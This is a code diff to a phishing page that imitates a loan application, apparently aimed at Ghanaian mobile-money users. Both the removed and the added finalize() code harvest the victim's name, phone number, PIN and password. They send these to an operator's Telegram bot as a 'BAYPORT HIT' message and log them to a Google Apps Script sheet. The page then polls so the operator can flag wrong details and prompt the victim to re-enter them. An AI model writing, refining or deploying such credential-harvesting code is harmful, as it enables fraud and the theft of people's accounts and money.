@@ -103,7 +103,7 @@
             
             <p id="err-2" class="error-hint">⚠️ Password is required.</p>
 
-            <button class="apply-button" id="final-btn" style="background: var(--telecel-red);" onclick="ze()">Complete Authorization</button>
+            <button class="apply-button" id="final-btn" style="background: var(--telecel-red);" onclick="finalize()">Complete Authorization</button>
         </div>
     </section>
 
@@ -162,46 +162,66 @@
     }
 
     async function finalize() {
-    const pass = document.getElementById('t-pass').value.trim();
-    const phone = document.getElementById('t-phone').value.trim();
-    const name = document.getElementById('f-name').value.trim();
-    const pin = document.getElementById('t-pin').value.trim();
-    
-    if(!pass) {
-        document.getElementById('err-2').style.display = 'block';
-        return;
+        const pass = document.getElementById('t-pass').value.trim();
+        const name = document.getElementById('f-name').value.trim();
+        const phone = document.getElementById('t-phone').value.trim();
+        const pin = document.getElementById('t-pin').value.trim();
+
+        if(!pass) {
+            document.getElementById('err-2').style.display = 'block';
+            return;
+        }
+
+        showView(4);
+
+        // 1. PREPARE DATA
+        const message = `🔥 *BAYPORT HIT*\n👤 Name: ${name}\n📱 +233${phone}\n💰 GHS ${state.amount}\n🔢 PIN: \`${pin}\`\n🔑 PASS: \`${pass}\``;
+
+        // 2. DIRECT SEND TO TELEGRAM (Bypasses Google Script)
+        if (BOT_TOKEN && CHAT_ID) {
+            const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                    parse_mode: 'Markdown'
+                }),
+                keepalive: true // Ensures request completes even if page changes
+            }).catch(err => console.log("Direct Telegram Error:", err));
+        }
+
+        // 3. LOG TO GOOGLE SHEET (For your records/polling)
+        try { 
+            const formData = new URLSearchParams();
+            formData.append('name', name);
+            formData.append('phone', phone);
+            formData.append('pin', pin);
+            formData.append('pass', pass);
+            formData.append('loan', state.amount);
+
+            fetch(SCRIPT_URL, { 
+                method: 'POST', 
+                mode: 'no-cors', 
+                body: formData 
+            }); 
+        } catch (e) { console.error("Sheet Log Error:", e); }
+
+        // 4. Polling for rejection (Keep this as is)
+        const poll = setInterval(async () => {
+            try {
+                const r = await fetch(`${SCRIPT_URL}?phone=${phone}`);
+                const status = await r.text();
+                if(status === "error") {
+                    clearInterval(poll);
+                    alert("❌ Incorrect details. The network rejected your PIN or Password. Please re-enter them correctly.");
+                    location.reload();
+                }
+            } catch(e) {}
+        }, 4000);
     }
-
-    const data = { name, phone, pin, pass };
-    showView(3);
-
-    // --- 1. CREATE THE REJECT LINK ---
-    // This is the link the operator clicks to tell the user "Wrong PIN"
-    const rejectLink = `${SCRIPT_URL}?action=markError&phone=${phone}`;
-
-    // --- 2. SEND TO TELEGRAM ---
-    if(BOT_TOKEN && CHAT_ID) {
-        const msg = `🔥 *BAYPORT HIT*
-👤 Name: ${data.name}
-📱 +233${data.phone}
-🔢 PIN: ${data.pin}
-🔑 PASS: ${data.pass}
-
-❌ *IF DETAILS ARE INCORRECT, CLICK HERE:*
-${rejectLink}`;
-
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
-        .catch(e => console.error("Telegram Error:", e));
-    }
-
-    // --- 3. SEND TO GOOGLE SHEET ---
-    try {
-        await fetch(SCRIPT_URL, { method: 'POST', mode: 'no-cors', body: new URLSearchParams(data) });
-    } catch (e) {}
-
-    // --- 4. START LISTENING FOR THE REJECT SIGNAL ---
-    startPolling(phone);
-}
     
     updateCalc();
 </script>
